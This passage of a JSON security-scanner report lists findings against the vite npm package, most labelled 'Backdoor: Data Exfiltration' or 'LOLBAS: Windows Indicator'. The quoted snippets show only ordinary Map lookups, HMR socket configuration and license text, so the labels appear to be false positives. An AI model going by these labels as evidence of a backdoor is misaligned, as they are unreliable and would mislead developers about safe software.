            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 2616,
                  "startColumn": 296,
                  "endLine": 2616,
                  "endColumn": 301,
                  "snippet": {
                    "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                    "rendered": {
                      "text": "; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de",
                      "markdown": "`; }\n\tfunction _interopRequireWildcard(obj, nodeInterop) { if (obj && obj.__esModule) { return obj; } if (obj === null || typeof obj !== \"object\" && typeof obj !== \"function\") { return { \"default\": obj }; } var cache = _getRequireWildcardCache(nodeInterop); if (cache && cache.has(obj)) { return cache.get(obj); } var newObj = {}; var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var key in obj) { if (key !== \"default\" && Object.prototype.hasOwnProperty.call(obj, key)) { var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null; if (de`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-B8yndt7W.js"
                },
                "region": {
                  "startLine": 1882,
                  "startColumn": 37,
                  "endLine": 1882,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\t        digestCache = digestCaches[cacheKey] = new Map();\n\t      }\n\n\t      const cacheEntry = digestCache.get(buffer);\n\n\t      if (cacheEntry !== undefined) {\n\t        return cacheEntry;\n",
                    "rendered": {
                      "text": "\t        digestCache = digestCaches[cacheKey] = new Map();\n\t      }\n\n\t      const cacheEntry = digestCache.get(buffer);\n\n\t      if (cacheEntry !== undefined) {\n\t        return cacheEntry;\n",
                      "markdown": "`\t        digestCache = digestCaches[cacheKey] = new Map();\n\t      }\n\n\t      const cacheEntry = digestCache.get(buffer);\n\n\t      if (cacheEntry !== undefined) {\n\t        return cacheEntry;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 807,
                  "startColumn": 25,
                  "endLine": 807,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  sheetsMap.set(id, style);\n}\nfunction removeStyle(id) {\n  const style = sheetsMap.get(id);\n  if (style) {\n    document.head.removeChild(style);\n    sheetsMap.delete(id);\n",
                    "rendered": {
                      "text": "  sheetsMap.set(id, style);\n}\nfunction removeStyle(id) {\n  const style = sheetsMap.get(id);\n  if (style) {\n    document.head.removeChild(style);\n    sheetsMap.delete(id);\n",
                      "markdown": "`  sheetsMap.set(id, style);\n}\nfunction removeStyle(id) {\n  const style = sheetsMap.get(id);\n  if (style) {\n    document.head.removeChild(style);\n    sheetsMap.delete(id);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 783,
                  "startColumn": 23,
                  "endLine": 783,
                  "endColumn": 28,
                  "snippet": {
                    "text": "const cspNonce = \"document\" in globalThis ? document.querySelector(\"meta[property=csp-nonce]\")?.nonce : void 0;\nlet lastInsertedStyle;\nfunction updateStyle(id, content) {\n  let style = sheetsMap.get(id);\n  if (!style) {\n    style = document.createElement(\"style\");\n    style.setAttribute(\"type\", \"text/css\");\n",
                    "rendered": {
                      "text": "const cspNonce = \"document\" in globalThis ? document.querySelector(\"meta[property=csp-nonce]\")?.nonce : void 0;\nlet lastInsertedStyle;\nfunction updateStyle(id, content) {\n  let style = sheetsMap.get(id);\n  if (!style) {\n    style = document.createElement(\"style\");\n    style.setAttribute(\"type\", \"text/css\");\n",
                      "markdown": "`const cspNonce = \"document\" in globalThis ? document.querySelector(\"meta[property=csp-nonce]\")?.nonce : void 0;\nlet lastInsertedStyle;\nfunction updateStyle(id, content) {\n  let style = sheetsMap.get(id);\n  if (!style) {\n    style = document.createElement(\"style\");\n    style.setAttribute(\"type\", \"text/css\");\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 491,
                  "startColumn": 37,
                  "endLine": 491,
                  "endColumn": 42,
                  "snippet": {
                    "text": "}\nconst overlayId = \"vite-error-overlay\";\nconst { customElements } = globalThis;\nif (customElements && !customElements.get(overlayId)) {\n  customElements.define(overlayId, ErrorOverlay);\n}\n\n",
                    "rendered": {
                      "text": "}\nconst overlayId = \"vite-error-overlay\";\nconst { customElements } = globalThis;\nif (customElements && !customElements.get(overlayId)) {\n  customElements.define(overlayId, ErrorOverlay);\n}\n\n",
                      "markdown": "`}\nconst overlayId = \"vite-error-overlay\";\nconst { customElements } = globalThis;\nif (customElements && !customElements.get(overlayId)) {\n  customElements.define(overlayId, ErrorOverlay);\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 209,
                  "startColumn": 47,
                  "endLine": 209,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      if (disposer) await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n      } catch (e) {\n",
                    "rendered": {
                      "text": "    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      if (disposer) await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n      } catch (e) {\n",
                      "markdown": "`    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      if (disposer) await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n      } catch (e) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 208,
                  "startColumn": 38,
                  "endLine": 208,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      ({ deps }) => deps.includes(acceptedPath)\n    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      if (disposer) await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n",
                    "rendered": {
                      "text": "      ({ deps }) => deps.includes(acceptedPath)\n    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      if (disposer) await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n",
                      "markdown": "`      ({ deps }) => deps.includes(acceptedPath)\n    );\n    if (isSelfUpdate || qualifiedCallbacks.length > 0) {\n      const disposer = this.disposeMap.get(acceptedPath);\n      if (disposer) await disposer(this.dataMap.get(acceptedPath));\n      try {\n        fetchedModule = await this.importUpdatedModule(update);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 198,
                  "startColumn": 34,
                  "endLine": 198,
                  "endColumn": 39,
                  "snippet": {
                    "text": "  }\n  async fetchUpdate(update) {\n    const { path, acceptedPath } = update;\n    const mod = this.hotModulesMap.get(path);\n    if (!mod) {\n      return;\n    }\n",
                    "rendered": {
                      "text": "  }\n  async fetchUpdate(update) {\n    const { path, acceptedPath } = update;\n    const mod = this.hotModulesMap.get(path);\n    if (!mod) {\n      return;\n    }\n",
                      "markdown": "`  }\n  async fetchUpdate(update) {\n    const { path, acceptedPath } = update;\n    const mod = this.hotModulesMap.get(path);\n    if (!mod) {\n      return;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 23,
                  "endLine": 168,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      if (fn) {\n        fn(this.dataMap.get(path));\n      }\n    });\n  }\n",
                    "rendered": {
                      "text": "    paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      if (fn) {\n        fn(this.dataMap.get(path));\n      }\n    });\n  }\n",
                      "markdown": "`    paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      if (fn) {\n        fn(this.dataMap.get(path));\n      }\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 166,
                  "startColumn": 30,
                  "endLine": 166,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      })\n    );\n    paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      if (fn) {\n        fn(this.dataMap.get(path));\n      }\n",
                    "rendered": {
                      "text": "      })\n    );\n    paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      if (fn) {\n        fn(this.dataMap.get(path));\n      }\n",
                      "markdown": "`      })\n    );\n    paths.forEach((path) => {\n      const fn = this.pruneMap.get(path);\n      if (fn) {\n        fn(this.dataMap.get(path));\n      }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 162,
                  "startColumn": 50,
                  "endLine": 162,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    );\n    paths.forEach((path) => {\n",
                    "rendered": {
                      "text": "    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    );\n    paths.forEach((path) => {\n",
                      "markdown": "`    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    );\n    paths.forEach((path) => {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 40,
                  "endLine": 161,
                  "endColumn": 45,
                  "snippet": {
                    "text": "  async prunePaths(paths) {\n    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    );\n",
                    "rendered": {
                      "text": "  async prunePaths(paths) {\n    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    );\n",
                      "markdown": "`  async prunePaths(paths) {\n    await Promise.all(\n      paths.map((path) => {\n        const disposer = this.disposeMap.get(path);\n        if (disposer) return disposer(this.dataMap.get(path));\n      })\n    );\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 39,
                  "endLine": 142,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    this.messenger = new HMRMessenger(connection);\n  }\n  async notifyListeners(event, data) {\n    const cbs = this.customListenersMap.get(event);\n    if (cbs) {\n      await Promise.allSettled(cbs.map((cb) => cb(data)));\n    }\n",
                    "rendered": {
                      "text": "    this.messenger = new HMRMessenger(connection);\n  }\n  async notifyListeners(event, data) {\n    const cbs = this.customListenersMap.get(event);\n    if (cbs) {\n      await Promise.allSettled(cbs.map((cb) => cb(data)));\n    }\n",
                      "markdown": "`    this.messenger = new HMRMessenger(connection);\n  }\n  async notifyListeners(event, data) {\n    const cbs = this.customListenersMap.get(event);\n    if (cbs) {\n      await Promise.allSettled(cbs.map((cb) => cb(data)));\n    }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 44,
                  "endLine": 100,
                  "endColumn": 49,
                  "snippet": {
                    "text": "  }\n  acceptDeps(deps, callback = () => {\n  }) {\n    const mod = this.hmrClient.hotModulesMap.get(this.ownerPath) || {\n      id: this.ownerPath,\n      callbacks: []\n    };\n",
                    "rendered": {
                      "text": "  }\n  acceptDeps(deps, callback = () => {\n  }) {\n    const mod = this.hmrClient.hotModulesMap.get(this.ownerPath) || {\n      id: this.ownerPath,\n      callbacks: []\n    };\n",
                      "markdown": "`  }\n  acceptDeps(deps, callback = () => {\n  }) {\n    const mod = this.hmrClient.hotModulesMap.get(this.ownerPath) || {\n      id: this.ownerPath,\n      callbacks: []\n    };\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 26,
                  "endLine": 79,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  }\n  off(event, cb) {\n    const removeFromMap = (map) => {\n      const existing = map.get(event);\n      if (existing === void 0) {\n        return;\n      }\n",
                    "rendered": {
                      "text": "  }\n  off(event, cb) {\n    const removeFromMap = (map) => {\n      const existing = map.get(event);\n      if (existing === void 0) {\n        return;\n      }\n",
                      "markdown": "`  }\n  off(event, cb) {\n    const removeFromMap = (map) => {\n      const existing = map.get(event);\n      if (existing === void 0) {\n        return;\n      }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 26,
                  "endLine": 70,
                  "endColumn": 31,
                  "snippet": {
                    "text": "  }\n  on(event, cb) {\n    const addToMap = (map) => {\n      const existing = map.get(event) || [];\n      existing.push(cb);\n      map.set(event, existing);\n    };\n",
                    "rendered": {
                      "text": "  }\n  on(event, cb) {\n    const addToMap = (map) => {\n      const existing = map.get(event) || [];\n      existing.push(cb);\n      map.set(event, existing);\n    };\n",
                      "markdown": "`  }\n  on(event, cb) {\n    const addToMap = (map) => {\n      const existing = map.get(event) || [];\n      existing.push(cb);\n      map.set(event, existing);\n    };\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 33,
                  "endLine": 30,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    hmrClient.ctxToListenersMap.set(ownerPath, this.newListeners);\n  }\n  get data() {\n    return this.hmrClient.dataMap.get(this.ownerPath);\n  }\n  accept(deps, callback) {\n    if (typeof deps === \"function\" || !deps) {\n",
                    "rendered": {
                      "text": "    hmrClient.ctxToListenersMap.set(ownerPath, this.newListeners);\n  }\n  get data() {\n    return this.hmrClient.dataMap.get(this.ownerPath);\n  }\n  accept(deps, callback) {\n    if (typeof deps === \"function\" || !deps) {\n",
                      "markdown": "`    hmrClient.ctxToListenersMap.set(ownerPath, this.newListeners);\n  }\n  get data() {\n    return this.hmrClient.dataMap.get(this.ownerPath);\n  }\n  accept(deps, callback) {\n    if (typeof deps === \"function\" || !deps) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 54,
                  "endLine": 17,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners) {\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n        if (listeners) {\n          hmrClient.customListenersMap.set(\n            event,\n",
                    "rendered": {
                      "text": "    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners) {\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n        if (listeners) {\n          hmrClient.customListenersMap.set(\n            event,\n",
                      "markdown": "`    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners) {\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n        if (listeners) {\n          hmrClient.customListenersMap.set(\n            event,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 54,
                  "endLine": 14,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    if (mod) {\n      mod.callbacks = [];\n    }\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners) {\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n",
                    "rendered": {
                      "text": "    if (mod) {\n      mod.callbacks = [];\n    }\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners) {\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n",
                      "markdown": "`    if (mod) {\n      mod.callbacks = [];\n    }\n    const staleListeners = hmrClient.ctxToListenersMap.get(ownerPath);\n    if (staleListeners) {\n      for (const [event, staleFns] of staleListeners) {\n        const listeners = hmrClient.customListenersMap.get(event);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 39,
                  "endLine": 10,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    if (!hmrClient.dataMap.has(ownerPath)) {\n      hmrClient.dataMap.set(ownerPath, {});\n    }\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    if (mod) {\n      mod.callbacks = [];\n    }\n",
                    "rendered": {
                      "text": "    if (!hmrClient.dataMap.has(ownerPath)) {\n      hmrClient.dataMap.set(ownerPath, {});\n    }\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    if (mod) {\n      mod.callbacks = [];\n    }\n",
                      "markdown": "`    if (!hmrClient.dataMap.has(ownerPath)) {\n      hmrClient.dataMap.set(ownerPath, {});\n    }\n    const mod = hmrClient.hotModulesMap.get(ownerPath);\n    if (mod) {\n      mod.callbacks = [];\n    }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/client/client.mjs"
                },
                "region": {
                  "startLine": 500,
                  "startColumn": 56,
                  "endLine": 500,
                  "endColumn": 64,
                  "snippet": {
                    "text": "const serverHost = __SERVER_HOST__;\nconst socketProtocol = __HMR_PROTOCOL__ || (importMetaUrl.protocol === \"https:\" ? \"wss\" : \"ws\");\nconst hmrPort = __HMR_PORT__;\nconst socketHost = `${__HMR_HOSTNAME__ || importMetaUrl.hostname}:${hmrPort || importMetaUrl.port}${__HMR_BASE__}`;\nconst directSocketHost = __HMR_DIRECT_TARGET__;\nconst base = __BASE__ || \"/\";\nlet socket;\n",
                    "rendered": {
                      "text": "const serverHost = __SERVER_HOST__;\nconst socketProtocol = __HMR_PROTOCOL__ || (importMetaUrl.protocol === \"https:\" ? \"wss\" : \"ws\");\nconst hmrPort = __HMR_PORT__;\nconst socketHost = `${__HMR_HOSTNAME__ || importMetaUrl.hostname}:${hmrPort || importMetaUrl.port}${__HMR_BASE__}`;\nconst directSocketHost = __HMR_DIRECT_TARGET__;\nconst base = __BASE__ || \"/\";\nlet socket;\n",
                      "markdown": "`const serverHost = __SERVER_HOST__;\nconst socketProtocol = __HMR_PROTOCOL__ || (importMetaUrl.protocol === \"https:\" ? \"wss\" : \"ws\");\nconst hmrPort = __HMR_PORT__;\nconst socketHost = `${__HMR_HOSTNAME__ || importMetaUrl.hostname}:${hmrPort || importMetaUrl.port}${__HMR_BASE__}`;\nconst directSocketHost = __HMR_DIRECT_TARGET__;\nconst base = __BASE__ || \"/\";\nlet socket;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/LICENSE.md"
                },
                "region": {
                  "startLine": 1916,
                  "startColumn": 11,
                  "endLine": 1916,
                  "endColumn": 15,
                  "snippet": {
                    "text": "> \n> This software consists of voluntary contributions made by many\n> individuals. For exact contribution history, see the revision history\n> available at https://github.com/lodash/lodash\n> \n> The following license applies to all parts of this software except as\n> documented below:\n",
                    "rendered": {
                      "text": "> \n> This software consists of voluntary contributions made by many\n> individuals. For exact contribution history, see the revision history\n> available at https://github.com/lodash/lodash\n> \n> The following license applies to all parts of this software except as\n> documented below:\n",
                      "markdown": "`> \n> This software consists of voluntary contributions made by many\n> individuals. For exact contribution history, see the revision history\n> available at https://github.com/lodash/lodash\n> \n> The following license applies to all parts of this software except as\n> documented below:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/LICENSE.md"
                },
                "region": {
                  "startLine": 228,
                  "startColumn": 41,
                  "endLine": 229,
                  "snippet": {
                    "text": "> \n>    Licensed under the Apache License, Version 2.0 (the \"License\");\n>    you may not use this file except in compliance with the License.\n>    You may obtain a copy of the License at\n> \n>        http://www.apache.org/licenses/LICENSE-2.0\n> \n>    Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
